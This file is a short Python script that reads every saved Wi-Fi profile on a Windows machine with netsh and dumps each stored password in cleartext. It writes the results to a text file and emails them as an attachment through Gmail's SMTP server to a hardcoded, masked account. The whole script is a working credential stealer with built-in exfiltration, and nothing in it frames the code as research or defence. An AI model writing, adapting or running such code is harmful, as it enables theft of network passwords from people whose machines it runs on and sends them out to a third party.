import subprocess
import smtplib
import re
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


def send_mail_with_attachment(email, password, subject, attachment_data):
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = subject
    
    attachment_filename = "wifi_networks.txt"
    with open(attachment_filename, "w", encoding="utf-8") as file:
        file.write(attachment_data)
    
    with open(attachment_filename, "rb") as file:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{attachment_filename}"')
        msg.attach(part)
    
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(email, password)
            server.sendmail(email, email, msg.as_string())
        print("The letter was sent!")
    except Exception as e:
        print(f"Error: {e}")


command = 'netsh wlan show profile'
network_output = subprocess.check_output(command, shell=True)
network_names_list = re.findall(b"(?:Profile\\s*:\\s)(.*)", network_output)

result = []
for network_names in network_names_list:
    current_network_name = network_names.decode('utf-8').strip()

    command = f'netsh wlan show profile name="{current_network_name}" key=clear'
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    stdout, stderr = process.communicate()

    stdout = stdout.decode('utf-8').strip()

    process.stdout.close()
    process.wait()

    if "Profile" in stdout and "not found" in stdout:
        command = f'netsh wlan show profile name="{current_network_name} " key=clear'
        current_result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        result_stdout, result_stderr = current_result.communicate()
        current_result.stdout.close()
        current_result.wait()

        result_stdout = result_stdout.decode('utf-8').strip()
        result_stderr = result_stderr.decode('utf-8').strip()
        result.append(result_stdout)
        if result_stderr:
            result.append(result_stderr)

    else:
        result.append(stdout)
        if stderr:
            result.append(stderr)

result_string = "\n".join(result)

send_mail_with_attachment("***********@gmail.com", "**** **** **** ****", "Wifi - Informations", result_string)

